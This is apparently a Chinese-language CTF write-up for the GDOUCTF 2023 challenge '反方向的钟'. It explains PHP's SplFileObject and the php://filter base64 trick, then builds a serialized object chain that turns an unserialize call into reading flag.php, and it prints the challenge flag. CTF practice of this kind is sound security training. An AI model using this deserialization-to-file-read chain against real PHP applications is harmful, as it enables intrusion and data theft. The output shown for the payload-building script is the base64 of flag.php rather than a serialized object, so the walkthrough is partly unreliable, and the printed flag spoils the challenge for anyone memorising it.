---
title: '[GDOUCTF 2023]反方向的钟'
date: '2025-05-27T20:40:50+08:00'
weight: 
draft: false
description: '[GDOUCTF 2023]反方向的钟'
---

### 前置知识

**SplFileObject** 是 PHP 中的一个内置类，属于 SPL（Standard PHP Library），主要用于以面向对象的方式读取和操作文件内容。

```text {filename="text.txt"}
Hello
World
I Love You
```

示例用法：

```php
<?php

$file = new SplFileObject("file.txt");

foreach ($file as $line) {
    echo $line;
}
```

运行结果：

```text
Hello
World
I Love You
```

直接 `echo new SplFileObject("file.txt");` 只会输出 `file.txt` 第一行的内容

```php
echo new SplFileObject("file.txt");
```

运行结果：

```text
Hello
```

使用 php 伪协议对文件内容进行 `base64` 编码使其变成一行内容

```php
echo new SplFileObject("php://filter/read=convert.base64-encode/resource=./file.txt");
```

运行结果：

```text
SGVsbG8NCldvcmxkDQpJIExvdmUgWW91
```

进行 `base64` 解码：

```text
Hello
World
I Love You
```

### 题目解答

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
// flag.php
class teacher{
    public $name;
    public $rank;
    private $salary;
    public function __construct($name,$rank,$salary = 10000){
        $this->name = $name;
        $this->rank = $rank;
        $this->salary = $salary;
    }
}

class classroom{
    public $name;
    public $leader;
    public function __construct($name,$leader){
        $this->name = $name;
        $this->leader = $leader;
    }
    public function hahaha(){
        if($this->name != 'one class' or $this->leader->name != 'ing' or $this->leader->rank !='department'){
            return False;
        }
        else{
            return True;
        }
    }
}

class school{
    public $department;
    public $headmaster;
    public function __construct($department,$ceo){
        $this->department = $department;
        $this->headmaster = $ceo;
    }
    public function IPO(){
        if($this->headmaster == 'ong'){
            echo "Pretty Good ! Ctfer!\n";
            echo new $_POST['a']($_POST['b']);
        }
    }
    public function __wakeup(){
        if($this->department->hahaha()) {
            $this->IPO();
        }
    }
}

if(isset($_GET['d'])){
    unserialize(base64_decode($_GET['d']));
}
?>
```

构造 payload：`a=SplFileObject&b=php://filter/read=convert.base64-encode/resource=./flag.php`

```text {filename="d"}
PD9waHANCiRmbGFnID0gIk5TU0NURntmOGUxMmY0NS03ZGJmLTQ3NjctYTVmNy05OGQ3YmVmNWNkMGN9IjsNCj8+DQo=
```

```php
<?php
class teacher{
    public $name;
    public $rank;
    private $salary;
    public function __construct($name,$rank,$salary = 10000){
        $this->name = $name;
        $this->rank = $rank;
        $this->salary = $salary;
    }
}

class classroom{
    public $name;
    public $leader;
    public function __construct($name,$leader){
        $this->name = $name;
        $this->leader = $leader;
    }
}

class school{
    public $department;
    public $headmaster;
    public function __construct($department,$ceo){
        $this->department = $department;
        $this->headmaster = $ceo;
    }
}

$t = new teacher('ing', 'department');

$c = new classroom('one class', $t);

$s = new school($c, 'ong');

echo base64_encode(serialize($s));
```

运行结果：

```text
PD9waHANCiRmbGFnID0gIk5TU0NURntmOGUxMmY0NS03ZGJmLTQ3NjctYTVmNy05OGQ3YmVmNWNkMGN9IjsNCj8+DQo=
```

进行 `base64` 解码，获得 flag：`NSSCTF{f8e12f45-7dbf-4767-a5f7-98d7bef5cd0c}`

```php
<?php
$flag = "NSSCTF{f8e12f45-7dbf-4767-a5f7-98d7bef5cd0c}";
?>
```